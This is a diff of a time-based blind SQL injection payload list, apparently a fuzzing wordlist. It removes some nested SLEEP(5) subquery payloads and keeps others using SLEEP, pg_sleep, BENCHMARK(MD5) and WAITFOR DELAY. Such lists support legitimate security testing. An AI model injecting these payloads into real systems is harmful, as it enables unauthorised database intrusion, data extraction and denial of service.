@@ -2,9 +2,6 @@
 &&SLEEP(5)#
 &&SLEEP(5)&&'1
 &&SLEEP(5)--
-(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
-(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
-(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
 ) or benchmark(10000000,MD5(1))#
 ) or pg_sleep(5)--
 ) or sleep(5)="
@@ -27,11 +24,6 @@
 1)) or pg_sleep(5)--
 1)) or sleep(5)#
 ;waitfor delay '0:0:5'--
-AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
-AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
-AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
-AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
-AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
 AnD SLEEP(5)
 AnD SLEEP(5) ANd '1
 AnD SLEEP(5)#
